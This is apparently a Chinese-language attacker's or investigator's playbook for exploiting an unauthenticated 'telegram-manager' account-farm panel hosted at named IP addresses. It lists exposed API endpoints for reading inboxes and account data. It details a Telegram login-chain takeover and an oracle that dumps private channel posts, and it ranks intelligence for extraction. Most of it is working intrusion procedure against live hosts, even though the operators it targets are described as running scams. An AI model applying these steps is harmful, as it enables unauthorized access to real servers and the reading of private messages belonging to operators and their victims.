# telegram-manager 农场家族：无鉴权 Go 面板全利用链（217/95 农场，2026-09-01）

> 家族: 217.26.27.247（主农场）/ 95.214.63.193（第二农场）/ 207.246.111.44（主控，全密码墙）。
> 同款 Go+Vue「telegram-manager」应用（与 t2-central-v2-hardening.md 是同一家族的新旧实例对照）：
> **农场实例 API 完全无鉴权**，主控实例全局 auth 中间件铁壁。session 文件在 `/opt/telegram-manager/data/sessions/`，面板无下载 API。

## 1. 无鉴权 API 资产面（全部实测 200）

```
GET  /api/accounts?limit=2000                 账号库全量（limit 上限 2000；page 参数被忽略=假分页）
GET  /api/messages?limit=300&unread=1         ★受害者收件箱实时读取（明文消息+发送者 username）
POST /api/messages/refresh?limit=300&unread=1 触发全量拉取（>60s，nginx ~460s 后 504；后台进程跑）
GET  /api/messages/unread_count               未读计数（增长监控哨兵）
GET  /api/logs?limit=30 / /api/errors/count   面板活动日志（账号轮询/AUTH_KEY_UNREGISTERED 死号）
POST /api/accounts                            建号（phone/app_id/app_hash 必填）
PUT  /api/accounts/{id}/proxy {proxy_id}      分配代理
POST /api/accounts/{id}/auth/start            开始 TG 登录链
GET  /api/accounts/{id}/auth/status           waiting_code / requesting_code / completed / error
POST /api/accounts/{id}/auth/code {code}      提交验证码（2FA 账号转 waiting_password）
POST /api/accounts/{id}/auth/password         提交 2FA（面板不存 2FA，只透传）
DELETE /api/accounts/{id}/auth                取消登录链
GET  /api/online/status                       在线引擎状态
POST /api/online/start {"mode":"continuous"}  ★启停运营方在线保持引擎（验证后必须 stop 还原！）
GET  /api/ad-forward/pairs /api/reactions/channels  广告转发对 + reaction 频道（含 invite_hash+access_hash）
GET  /api/reactions/profiles /api/tasks?limit=1000  刷量配置 + 任务历史（客户渠道情报）
GET  /api/security/action-password            → {"required":true}（DELETE/管理操作要 X-Action-Password 头）
GET  /api/folders / /api/folders/{id}/accounts      分组（kind: normal/watchers/reactions_only）
POST /api/folders {name,kind}                 可自建 watchers 组（绕「观察者必须在 watchers 组」校验）
```

## 2. 登录链闭环自测（验证接管可行性的标准动作）

1. 在面板 create 自号（或 bulk-import）→ PUT 分配自备 socks5 代理（/api/proxies 建）。
2. `POST /auth/start` → 面板服务端向 TG 发码。
3. **用自有 TG session（telethon）轮询 777000 抓码**：
   - 坑：`get_entity('777000')` 无缓存对话框时抛 ValueError → 用 `get_entity('+<自有手机号>')` 拿 input peer 再 `get_messages(peer)`。
   - `Login code: (\d{5})` 正则提取，比对 msg id 防旧码。
4. `POST /auth/code` → 无 2FA 号直接 `completed`；有 2FA 号转 `waiting_password`（面板不回显不存储 2FA → 系统性 2FA 死路，别挖）。
5. 完成即该账号 session 落在服务器磁盘（无导出 API → 仍需主机层/主控 RCE 才能取文件本体）。

**95 农场实测教训**：auth worker 日志「Запрос кода через веб-API」但自有号从未收到码（worker 侧 TG 出口死）——同一链在 217 秒通。**先在 217 型实例做闭环，别在坏 worker 上耗**。cancel 再 start 可复挂起状态；DELETE 账号后重建才算干净重试。

## 3. TG 直读 Oracle（★最有价值漏洞模式）

```
GET /api/reactions/polls/preview?channel_ref_id={任意已注册频道id}&post_link={任意 t.me 链接}
```
- `post_link` **不校验归属**：服务端用 watcher 账号 session 实时拉取 `t.me/{公开频道}/{id}` 或 `t.me/+{invite_hash}/{id}`。
- 错误诊断回显消息正文片段（~40 字符）+ 媒体类型：`Message{id=… media=*tg.MessageMediaPhoto text=\"…正文…\"}`；非 polls 消息报「в сообщении нет опроса」但仍回显内容 → 变成**私有频道全文读取器**。
- 前置条件：channel_ref_id 必须存在（任意一条注册频道即可，id 不匹配报「канал N не найден」）；watcher 必须在 kind=watchers 组且已分配代理（「У наблюдателя нет прокси」），否则 400（这些报错=免费校验 oracle）。
- 利用：新 watch 目标→用面板已有 invite_hash 建 reaction channel（自动加群）→ 遍历 post_link 1..40 抓全文。15 频道×40 消息 ≈ 240s 落盘 326 条。
- 限频宽松但串行 ~2.5s/请求；dump 用 channel_ref_id 轮转避免单 watcher 会话过热。

## 4. 情报榨取优先级

1. 收件箱 unread=1 → 运营方业务流+受害者对话+广播活动（promo 码/客户渠道/诈-骗话术模板）。
2. logs 的 `AUTH_KEY_UNREGISTERED` 计数 → 活号率（本案 ~50% 死号，决定收割价值）。
3. ad-forward/pairs + reactions/channels + tasks → 运营方广告网络全图（源频道=引流对象，目标频道=按卖家命名）。
4. accounts notes「Импортирован из JSON. Telegram ID: N」= 批量导入批次痕迹。

## 5. 纪律与坑

- **online/start 空参会以其 profiles 账号集真实启动引擎** → 动它之前先 GET status 记录原状，验证后立即 stop 还原（破坏面归零纪律）。
- `read_and_block`、DELETE、operations/join 是破坏/动作面：delete 无 header 返回 401（不执行）——但别拿真实资源 ID 试破坏端点，用 99999999 类不存在 ID 测鉴权。
- X-Action-Password 头值不能含非 latin-1 原始字符；俄语候选需 `urllib.parse.quote` 或 raw utf-8 bytes 变体双试。
- SPA 前端 bundle（/assets/*.js）仍是端点地图第一来源：本例 78 个 /api/ 字面量，25 个 openapi 未列。
- 分页假象：`page` 参数被忽略、limit cap 2000 → 全量导出靠 offset/多限值组合验证（对比 first/last id）。
